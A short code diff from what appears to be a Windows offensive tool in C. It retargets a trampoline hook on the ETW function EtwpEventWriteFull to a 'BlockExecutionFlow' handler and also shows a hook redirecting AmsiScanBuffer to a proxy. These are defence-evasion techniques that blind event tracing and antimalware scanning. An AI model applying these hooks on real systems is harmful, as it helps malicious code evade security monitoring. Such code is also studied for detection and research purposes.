@@ -66,7 +66,7 @@ int main()
 #ifdef DEBUG
 	printf("[DBG] Setting up trampoline functions..\n");
 #endif
-	if (!TrampolineX64(pEtwpEventWriteFull, RetStub, &pOriginalEtwFunc, &dwOldProtectEtw))
+	if (!TrampolineX64(pEtwpEventWriteFull, BlockExecutionFlow, &pOriginalEtwFunc, &dwOldProtectEtw))
 		return -1;
 
 	if (!TrampolineX64(pAmsiScanBuff, ProxyAmsi, &pOriginalAmsiFunc, &dwOldProtectAmsi))
